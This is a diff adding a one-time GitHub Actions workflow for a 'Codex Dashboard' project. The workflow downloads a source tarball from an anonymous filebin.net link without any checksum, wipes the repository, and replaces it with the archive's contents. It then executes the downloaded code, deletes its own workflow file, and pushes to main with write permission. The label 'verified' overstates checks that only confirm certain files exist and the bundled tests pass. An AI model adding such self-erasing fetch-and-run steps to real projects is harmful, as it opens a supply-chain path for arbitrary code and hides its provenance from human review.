@@ -1,0 +1,95 @@
+name: Bootstrap verified source
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - .github/workflows/bootstrap-source.yml
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+concurrency:
+  group: bootstrap-codex-dashboard
+  cancel-in-progress: false
+
+jobs:
+  bootstrap:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: Check out repository
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - name: Detect whether the verified implementation is already present
+        id: state
+        shell: bash
+        run: |
+          set -euo pipefail
+          if [[ -f docs/VERIFICATION.md \
+             && -f codex_dashboard/db.py \
+             && -f codex_dashboard/collector.py \
+             && -f codex_dashboard/static/app.js \
+             && -f tests/test_http.py ]]; then
+            echo 'complete=true' >> "$GITHUB_OUTPUT"
+          else
+            echo 'complete=false' >> "$GITHUB_OUTPUT"
+          fi
+
+      - name: Download the gated source archive
+        if: steps.state.outputs.complete != 'true'
+        shell: bash
+        run: |
+          set -euo pipefail
+          url='https://filebin.net/codex-dashboard-redwang-20260829-c7f4a91b/Codex-Dashboard-source.tar.gz'
+          curl --fail --location --silent --show-error \
+            --retry 5 --retry-all-errors --connect-timeout 20 \
+            "$url" --output /tmp/codex-dashboard-source.tar.gz
+          tar -tzf /tmp/codex-dashboard-source.tar.gz >/dev/null
+
+      - name: Restore full repository
+        if: steps.state.outputs.complete != 'true'
+        shell: bash
+        run: |
+          set -euo pipefail
+          tmp="$(mktemp -d)"
+          tar -xzf /tmp/codex-dashboard-source.tar.gz -C "$tmp"
+          test -f "$tmp/pyproject.toml"
+          test -f "$tmp/codex_dashboard/db.py"
+          test -f "$tmp/codex_dashboard/static/app.js"
+          test -f "$tmp/tests/test_http.py"
+          find . -mindepth 1 -maxdepth 1 ! -name .git -exec rm -rf {} +
+          cp -a "$tmp"/. .
+
+      - name: Verify restored implementation
+        if: steps.state.outputs.complete != 'true'
+        shell: bash
+        run: |
+          set -euo pipefail
+          python -m compileall -q codex_dashboard tests
+          python -m unittest discover -s tests -v
+          if command -v node >/dev/null 2>&1; then
+            node --check codex_dashboard/static/app.js
+          fi
+          python -m codex_dashboard --help >/dev/null
+
+      - name: Remove the one-time bootstrap workflow
+        shell: bash
+        run: rm -f .github/workflows/bootstrap-source.yml
+
+      - name: Commit verified tree
+        shell: bash
+        run: |
+          set -euo pipefail
+          git config user.name 'github-actions[bot]'
+          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
+          git add -A
+          if git diff --cached --quiet; then
+            echo 'Repository tree is already complete.'
+            exit 0
+          fi
+          git commit -m 'feat: publish complete Codex Control Center implementation'
+          git push origin HEAD:main
